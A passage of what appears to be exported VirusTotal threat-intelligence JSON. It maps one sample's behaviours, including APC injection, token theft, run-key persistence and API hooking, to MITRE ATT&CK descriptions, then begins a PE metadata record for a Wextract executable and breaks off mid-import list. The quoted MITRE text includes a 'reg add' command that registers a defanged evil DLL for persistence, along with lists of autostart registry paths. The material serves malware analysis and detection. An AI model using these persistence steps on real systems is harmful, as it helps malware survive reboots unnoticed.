                "description": "Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using DuplicateToken or DuplicateTokenEx. The token can then be used with ImpersonateLoggedOnUser to allow the calling thread to impersonate a logged on user's security context, or with SetThreadToken to assign the impersonated token to a thread.\nAn adversary may perform Token Impersonation/Theft when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.\nWhen an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally Create Process with Token using CreateProcessWithTokenW or CreateProcessAsUserW. Token Impersonation/Theft is also distinct from Make and Impersonate Token in that it refers to duplicating an existing token, rather than creating a new one.",
                "signatures": [
                  {
                    "severity": "MEDIUM",
                    "description": "token theft"
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0002",
            "name": "Execution",
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "id": "T1559.001",
                "name": "Component Object Model",
                "link": "https://attack.mitre.org/techniques/T1559/001/",
                "description": "Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE). Remote COM execution is facilitated by Remote Services such as  Distributed Component Object Model (DCOM).\nVarious COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and Visual Basic. Specific COM objects also exist to directly perform functions beyond code execution, such as creating a Scheduled Task/Job, fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.",
                "signatures": [
                  {
                    "severity": "MEDIUM",
                    "description": "use com interface"
                  }
                ]
              },
              {
                "id": "T1106",
                "name": "Native API",
                "link": "https://attack.mitre.org/techniques/T1106/",
                "description": "Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\nNative API functions (such as NtCreateProcess) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API CreateProcess() or GNU fork() will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools.",
                "signatures": [
                  {
                    "severity": "MEDIUM",
                    "description": "create new process"
                  }
                ]
              },
              {
                "id": "T1204.002",
                "name": "Malicious File",
                "link": "https://attack.mitre.org/techniques/T1204/002/",
                "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\nAdversaries may employ various forms of Masquerading and Obfuscated Files or Information to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. \nWhile Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.",
                "signatures": [
                  {
                    "severity": "MEDIUM",
                    "description": "create lnk file"
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0004",
            "name": "Privilege Escalation",
            "link": "https://attack.mitre.org/tactics/TA0004/",
            "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "techniques": [
              {
                "id": "T1055.004",
                "name": "Asynchronous Procedure Call",
                "link": "https://attack.mitre.org/techniques/T1055/004/",
                "description": "Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. \nAPC injection is commonly performed by attaching malicious code to the APC Queue  of a process's thread. Queued APC functions are executed when the thread enters an alterable state. A handle to an existing victim process is first created with native Windows API calls such as OpenThread. At this point QueueUserAPC can be used to invoke a function (such as LoadLibrayA pointing to a malicious DLL). \nA variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC.  AtomBombing  is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process. ",
                "signatures": [
                  {
                    "severity": "HIGH",
                    "description": "inject other processes with apc"
                  }
                ]
              },
              {
                "id": "T1134.001",
                "name": "Token Impersonation/Theft",
                "link": "https://attack.mitre.org/techniques/T1134/001/",
                "description": "Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using DuplicateToken or DuplicateTokenEx. The token can then be used with ImpersonateLoggedOnUser to allow the calling thread to impersonate a logged on user's security context, or with SetThreadToken to assign the impersonated token to a thread.\nAn adversary may perform Token Impersonation/Theft when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.\nWhen an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally Create Process with Token using CreateProcessWithTokenW or CreateProcessAsUserW. Token Impersonation/Theft is also distinct from Make and Impersonate Token in that it refers to duplicating an existing token, rather than creating a new one.",
                "signatures": [
                  {
                    "severity": "MEDIUM",
                    "description": "token theft"
                  }
                ]
              },
              {
                "id": "T1547.001",
                "name": "Registry Run Keys / Startup Folder",
                "link": "https://attack.mitre.org/techniques/T1547/001/",
                "description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\nThe following run keys are created by default on Windows systems:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n\nRun keys may exist under multiple hives. The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\" \nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. The startup folder path for all users is C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp.\nThe following Registry keys can be used to set startup folder items for persistence:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\n\nThe following Registry keys can control automatic startup of services during boot:\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\n\nPrograms listed in the load value of the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows run automatically for the currently logged-on user.\nBy default, the multistring BootExecute value of the registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
                "signatures": [
                  {
                    "severity": "MEDIUM",
                    "description": "write self start registry common"
                  }
                ]
              },
              {
                "id": "T1547.009",
                "name": "Shortcut Modification",
                "link": "https://attack.mitre.org/techniques/T1547/009/",
                "description": "Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\nAdversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence. Although often used as payloads in an infection chain (e.g. Spearphishing Attachment), adversaries may also create a new shortcut as a means of indirection, while also abusing Masquerading to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.\nShortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. Browser Extensions) to persistently launch malware.",
                "signatures": [
                  {
                    "severity": "MEDIUM",
                    "description": "create lnk file"
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0009",
            "name": "Collection",
            "link": "https://attack.mitre.org/tactics/TA0009/",
            "description": "The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to steal (exfiltrate) the data. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.",
            "techniques": [
              {
                "id": "T1005",
                "name": "Data from Local System",
                "link": "https://attack.mitre.org/techniques/T1005/",
                "description": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\nAdversaries may do this using a Command and Scripting Interpreter, such as cmd as well as a Network Device CLI, which have functionality to interact with the file system to gather information. Adversaries may also use Automated Collection on the local system.",
                "signatures": [
                  {
                    "severity": "MEDIUM",
                    "description": "collect disk information"
                  }
                ]
              },
              {
                "id": "T1056.004",
                "name": "Credential API Hooking",
                "link": "https://attack.mitre.org/techniques/T1056/004/",
                "description": "Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials. Unlike Keylogging,  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:\n\nHooks procedures, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.\nImport address table (IAT) hooking, which use modifications to a process’s IAT, where pointers to imported API functions are stored.\nInline hooking, which overwrites the first bytes in an API function to redirect code flow.\n",
                "signatures": [
                  {
                    "severity": "MEDIUM",
                    "description": "install message hook"
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0003",
            "name": "Persistence",
            "link": "https://attack.mitre.org/tactics/TA0003/",
            "description": "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ",
            "techniques": [
              {
                "id": "T1547.001",
                "name": "Registry Run Keys / Startup Folder",
                "link": "https://attack.mitre.org/techniques/T1547/001/",
                "description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\nThe following run keys are created by default on Windows systems:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n\nRun keys may exist under multiple hives. The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\" \nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. The startup folder path for all users is C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp.\nThe following Registry keys can be used to set startup folder items for persistence:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\n\nThe following Registry keys can control automatic startup of services during boot:\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\n\nPrograms listed in the load value of the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows run automatically for the currently logged-on user.\nBy default, the multistring BootExecute value of the registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
                "signatures": [
                  {
                    "severity": "MEDIUM",
                    "description": "write self start registry common"
                  }
                ]
              },
              {
                "id": "T1547.009",
                "name": "Shortcut Modification",
                "link": "https://attack.mitre.org/techniques/T1547/009/",
                "description": "Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\nAdversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence. Although often used as payloads in an infection chain (e.g. Spearphishing Attachment), adversaries may also create a new shortcut as a means of indirection, while also abusing Masquerading to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.\nShortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. Browser Extensions) to persistently launch malware.",
                "signatures": [
                  {
                    "severity": "MEDIUM",
                    "description": "create lnk file"
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0006",
            "name": "Credential Access",
            "link": "https://attack.mitre.org/tactics/TA0006/",
            "description": "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.",
            "techniques": [
              {
                "id": "T1056.004",
                "name": "Credential API Hooking",
                "link": "https://attack.mitre.org/techniques/T1056/004/",
                "description": "Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials. Unlike Keylogging,  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:\n\nHooks procedures, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.\nImport address table (IAT) hooking, which use modifications to a process’s IAT, where pointers to imported API functions are stored.\nInline hooking, which overwrites the first bytes in an API function to redirect code flow.\n",
                "signatures": [
                  {
                    "severity": "MEDIUM",
                    "description": "install message hook"
                  }
                ]
              }
            ]
          }
        ]
      }
    },
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/4f131095ba56f6d3621a007985ac758d780b0c837f554f6e44d535ed55d33af1/behaviour_mitre_trees"
    }
  }
},
{
  "_id": {
    "$oid": "65bacb211ae6cefdf2180dc0"
  },
  "data": {
    "id": "136e709cc83cbda0cd8ca6e46fe9e57202bd2699ca063f9d1a51602394c06ef3",
    "type": "file",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/136e709cc83cbda0cd8ca6e46fe9e57202bd2699ca063f9d1a51602394c06ef3"
    },
    "attributes": {
      "tlsh": "T11FC3BE2386C0953FC4D053B045EE26A327B8F8E02B9927F7928996D56C653D43A3D36F",
      "names": [
        "Wextract",
        "WEXTRACT.EXE",
        "03d047380078676b17617ce04a6585ab71640790.codex",
        "E2A4B96CCE9DE4FB126CFD5F5C73C3ED.exe",
        "vti-rescan",
        "1.gif_",
        "1.zip.gif"
      ],
      "type_tags": [
        "executable",
        "windows",
        "win32",
        "pe",
        "peexe"
      ],
      "crowdsourced_yara_results": [
        {
          "description": "Detects suspicious XORed MSDOS stub message",
          "author": "Florian Roth",
          "ruleset_name": "gen_xor_hunting",
          "rule_name": "SUSP_XORed_MSDOS_Stub_Message",
          "ruleset_id": "00054b746e",
          "match_in_subfile": true,
          "source": "https://github.com/Neo23x0/signature-base"
        }
      ],
      "pe_info": {
        "timestamp": 1208111565,
        "imphash": "0ebb3c09b06b1666d307952e824c8697",
        "machine_type": 332,
        "entry_point": 25692,
        "resource_details": [
          {
            "lang": "CHINESE SIMPLIFIED",
            "chi2": 655945.62,
            "filetype": "unknown",
            "entropy": 3.5224080085754395,
            "sha256": "3bd1d253c90f7e82dc70dc1e4b869cc2e5e154e6b4079be93837e4a6c68044c0",
            "type": "AVI"
          },
          {
            "lang": "CHINESE SIMPLIFIED",
            "chi2": 30245.77,
            "filetype": "unknown",
            "entropy": 3.7501254081726074,
            "sha256": "ea5e771d2e590691c5c624a1204015a71d390ccb57781860f9cbc2fed1425f02",
            "type": "RT_ICON"
          },
          {
            "lang": "CHINESE SIMPLIFIED",
            "chi2": 13896.43,
            "filetype": "unknown",
            "entropy": 3.537933111190796,
            "sha256": "155ac1573c5f09ad098c18d0fa1cb6dc21081f0d969d743869938146abd9aa5e",
            "type": "RT_ICON"
          },
          {
            "lang": "CHINESE SIMPLIFIED",
            "chi2": 16109.92,
            "filetype": "unknown",
            "entropy": 4.743500709533691,
            "sha256": "7ed0c459b7cd3d5d0014aed734bb2db4884a353a0ff7cca377f3275546d941e5",
            "type": "RT_DIALOG"
          },
          {
            "lang": "CHINESE SIMPLIFIED",
            "chi2": 20206.13,
            "filetype": "unknown",
            "entropy": 3.604463815689087,
            "sha256": "4909c0592c857648a94cc2540f8deb3f794fc26140948fda86f5424824a50957",
            "type": "RT_DIALOG"
          },
          {
            "lang": "CHINESE SIMPLIFIED",
            "chi2": 22587.85,
            "filetype": "unknown",
            "entropy": 3.213841438293457,
            "sha256": "a57b72fe65a241107e344e9328c51065cbd3c7a528be6e9325eb001bdbee4906",
            "type": "RT_DIALOG"
          },
          {
            "lang": "CHINESE SIMPLIFIED",
            "chi2": 29904.47,
            "filetype": "unknown",
            "entropy": 3.5086474418640137,
            "sha256": "e26c548cd2c087f9b9afadf393e27fc27f7b299968a4113c3ba2d9f0205565fb",
            "type": "RT_DIALOG"
          },
          {
            "lang": "CHINESE SIMPLIFIED",
            "chi2": 16669.03,
            "filetype": "unknown",
            "entropy": 3.4316301345825195,
            "sha256": "5a4e3a829999b3ec1a9c6152aec3d2804a5aa226d8d47e591f17976858ac08e0",
            "type": "RT_DIALOG"
          },
          {
            "lang": "CHINESE SIMPLIFIED",
            "chi2": 18152.36,
            "filetype": "unknown",
            "entropy": 3.169222831726074,
            "sha256": "850fdc7798e74a6bd876e2de29c1c91095b2a9e9d94a3fb5128feb0f75472b77",
            "type": "RT_DIALOG"
          },
          {
            "lang": "CHINESE SIMPLIFIED",
            "chi2": 3990.35,
            "filetype": "unknown",
            "entropy": 3.5064356327056885,
            "sha256": "683085d43755eab51a849bd7a26cae729b4ce1a3362ca26c5e03f783bb265c71",
            "type": "RT_STRING"
          },
          {
            "lang": "CHINESE SIMPLIFIED",
            "chi2": 2006.45,
            "filetype": "unknown",
            "entropy": 6.372385501861572,
            "sha256": "6afadbcf914dc5e0579379b1025b71ede325a3f189333e60984fa723752bd49a",
            "type": "RT_STRING"
          },
          {
            "lang": "CHINESE SIMPLIFIED",
            "chi2": 10940.82,
            "filetype": "unknown",
            "entropy": 5.751668930053711,
            "sha256": "e4411f93a04e57f7ddab64ed995286eb33fb747e358688bec8619cd9eea96db6",
            "type": "RT_STRING"
          },
          {
            "lang": "CHINESE SIMPLIFIED",
            "chi2": 7968.69,
            "filetype": "unknown",
            "entropy": 5.780277729034424,
            "sha256": "b0424b7a3e6704024b62f7caff18929b5d094b9d953c97662d3341ac79daf214",
            "type": "RT_STRING"
          },
          {
            "lang": "CHINESE SIMPLIFIED",
            "chi2": 6494.52,
            "filetype": "unknown",
            "entropy": 5.663900375366211,
            "sha256": "998aaa50b72f1d45ec7ebf2ff93cd6286b11877b49c0d7cc0c93a5a9c9248fba",
            "type": "RT_STRING"
          },
          {
            "lang": "CHINESE SIMPLIFIED",
            "chi2": 3020,
            "filetype": "unknown",
            "entropy": 5.730735778808594,
            "sha256": "7d43c7b48d6897a806b93ecf4fef72b7fef4baaf2639a1138f82242cec6d8d93",
            "type": "RT_STRING"
          },
          {
            "lang": "ENGLISH US",
            "chi2": 249,
            "filetype": "unknown",
            "entropy": 2.8073551654815674,
            "sha256": "eaadcdd05a9a7c7f80d53d758f39e4399749d774b09a8a0165fe7c69ad6d8c3c",
            "type": "RT_RCDATA"
          },
          {
            "lang": "ENGLISH US",
            "chi2": 350.52,
            "filetype": "unknown",
            "entropy": 7.9955220222473145,
            "sha256": "b4098c74dc71f67f19c84b917668ecec024e7ec826fa75e50c0a518b3b03933a",
            "type": "RT_RCDATA"
          },
          {
            "lang": "ENGLISH US",
            "chi2": 636,
            "filetype": "unknown",
            "entropy": 0.8112781047821045,
            "sha256": "26b25d457597a7b0463f9620f666dd10aa2c4373a505967c7c8d70922a2d6ece",
            "type": "RT_RCDATA"
          },
          {
            "lang": "ENGLISH US",
            "chi2": 4515.11,
            "filetype": "unknown",
            "entropy": 1.8339139223098755,
            "sha256": "14a9b1e412fbcda5bf5c23b685b3efa9bfb76b33c8ea087659e8bccb02bbc559",
            "type": "RT_RCDATA"
          },
          {
            "lang": "ENGLISH US",
            "chi2": 1020,
            "filetype": "unknown",
            "entropy": 0,
            "sha256": "df3f619804a92fdb4057192dc43dd748ea778adc52bc498ce80524c014b81119",
            "type": "RT_RCDATA"
          },
          {
            "lang": "ENGLISH US",
            "chi2": 351.71,
            "filetype": "unknown",
            "entropy": 3.3787832260131836,
            "sha256": "7a3b5d7bd9846b725ca8417711cb80cd6beffb82ec2a366187c6b53db5808630",
            "type": "RT_RCDATA"
          },
          {
            "lang": "ENGLISH US",
            "chi2": 636,
            "filetype": "unknown",
            "entropy": 0.8112781047821045,
            "sha256": "67abdd721024f0ff4e0b3f4c2fc13bc5bad42d0b7851d456d88d203d15aaa450",
            "type": "RT_RCDATA"
          },
          {
            "lang": "ENGLISH US",
            "chi2": 254,
            "filetype": "unknown",
            "entropy": 1,
            "sha256": "913da1f8df6f8fd47593840d533ba0458cc9873996bf310460abb495b34c232a",
            "type": "RT_RCDATA"
          },
          {
            "lang": "CHINESE SIMPLIFIED",
            "chi2": 2345.29,
            "filetype": "ICO",
            "entropy": 2.370859146118164,
            "sha256": "b10e28a32eddb2ab20a46ceae59d9c0786911eb20f0c8dd2a28421f226ea2b8b",
            "type": "RT_GROUP_ICON"
          },
          {
            "lang": "CHINESE SIMPLIFIED",
            "chi2": 80745.79,
            "filetype": "unknown",
            "entropy": 3.445847749710083,
            "sha256": "72bee5ceb0a9efbc6db5da79c5f2b7e3ef7bf580b5178ba68f738f053ae2f78d",
            "type": "RT_VERSION"
          }
        ],
        "resource_langs": {
          "ENGLISH US": 14,
          "CHINESE SIMPLIFIED": 17
        },
        "resource_types": {
          "RT_DIALOG": 6,
          "RT_ICON": 2,
          "RT_STRING": 6,
          "AVI": 1,
          "RT_RCDATA": 14,
          "RT_VERSION": 1,
          "RT_GROUP_ICON": 1
        },
        "overlay": {
          "chi2": 8026.81,
          "filetype": "unknown",
          "entropy": 7.30783224105835,
          "offset": 117760,
          "size": 4832,
          "md5": "fc10bfc18206f780e7cfcc895b4aac0b"
        },
        "sections": [
          {
            "name": ".text",
            "chi2": 256029.44,
            "virtual_address": 4096,
            "entropy": 6.58,
            "raw_size": 39424,
            "flags": "rx",
            "virtual_size": 39368,
            "md5": "771e81b77e3bc3a726dd011a31947b8c"
          },
          {
            "name": ".data",
            "chi2": 37757,
            "virtual_address": 45056,
            "entropy": 4.25,
            "raw_size": 1024,
            "flags": "rw",
            "virtual_size": 7140,
            "md5": "99858e86526942a66950c7139f78a725"
          },
          {
            "name": ".rsrc",
            "chi2": 271396.62,
            "virtual_address": 53248,
            "entropy": 7.48,
            "raw_size": 76288,
            "flags": "r",
            "virtual_size": 77824,
            "md5": "71e38d4c4a6ca41cedd631d0b461aaa6"
          }
        ],
        "compiler_product_versions": [
          "id: 93, version: 4035 count=13",
          "[---] Unmarked objects count=134",
          "id: 94, version: 4035 count=1",
          "id: 95, version: 4035 count=27",
          "id: 90, version: 4035 count=1"
        ],
        "rich_pe_header_hash": "87c02cf7ae3b70f2eeb1122540dff093",
        "import_list": [
          {
            "library_name": "VERSION.dll",
            "imported_functions": [
              "GetFileVersionInfoA",
              "GetFileVersionInfoSizeA",
              "VerQueryValueA"
            ]
          },
          {
            "library_name": "GDI32.dll",
            "imported_functions": [
              "GetDeviceCaps"
            ]
          },
          {
            "library_name": "KERNEL32.dll",
            "imported_functions": [
              "_lclose",
              "_llseek",
              "_lopen",
              "CloseHandle",
              "CreateDirectoryA",
              "CreateEventA",
              "CreateFileA",
              "CreateMutexA",
              "CreateProcessA",
              "CreateThread",
              "DeleteFileA",
              "DosDateTimeToFileTime",
              "EnumResourceLanguagesA",
              "ExitProcess",
              "ExpandEnvironmentStringsA",
              "FindClose",
              "FindFirstFileA",
              "FindNextFileA",
              "FindResourceA",
              "FormatMessageA",
              "FreeLibrary",
              "FreeResource",
              "GetCommandLineA",
              "GetCurrentDirectoryA",
              "GetCurrentProcess",
              "GetCurrentProcessId",
              "GetCurrentThreadId",
              "GetDiskFreeSpaceA",
              "GetDriveTypeA",
              "GetExitCodeProcess",
              "GetFileAttributesA",
              "GetLastError",
              "GetModuleFileNameA",
              "GetModuleHandleA",
              "GetPrivateProfileIntA",
              "GetPrivateProfileStringA",
              "GetProcAddress",
              "GetShortPathNameA",
              "GetStartupInfoA",
              "GetSystemDirectoryA",
              "GetSystemInfo",
              "GetSystemTimeAsFileTime",
              "GetTempFileNameA",
              "GetTempPathA",
              "GetTickCount",
              "GetVersionExA",
              "GetVolumeInformationA",
              "GetWindowsDirectoryA",
              "GlobalAlloc",
              "GlobalFree",
